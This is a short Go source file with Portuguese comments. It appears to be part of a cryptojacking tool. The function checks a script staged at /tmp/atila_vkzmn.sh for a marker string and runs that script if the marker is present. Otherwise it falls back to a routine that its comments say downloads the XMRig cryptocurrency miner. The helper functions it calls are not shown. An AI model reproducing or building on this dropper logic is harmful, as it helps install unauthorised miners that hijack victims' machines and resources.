package main

//essa funcao vai verifica o magic  byte do arquivo atila_vkzmn.sh

import (
	"fmt"
	"io/ioutil"
	"os"
	"strings"
)

var my_magic_byte string = "#ATILA_VKZMN"

func magic_byte() {

	file_ok := 0

	ptr, err_op := os.Open("/tmp/atila_vkzmn.sh")

	if err_op == nil {

		magic_byte, err_readall := ioutil.ReadAll(ptr)

		if err_readall == nil {

			magic_str := string(magic_byte)

			out := strings.Contains(magic_str, my_magic_byte)

			if out == true {
				file_ok = 23
			}

		}

	}

	if file_ok == 23 { //execute script

		fmt.Println("file ok") //call exec_vkzmn

		exec_vkzmn()

	} else {

		fmt.Println("file not valid abaixe o xmrig raw")

		//file not valid download xmrig raw

		raw_xmrig()

	}

}
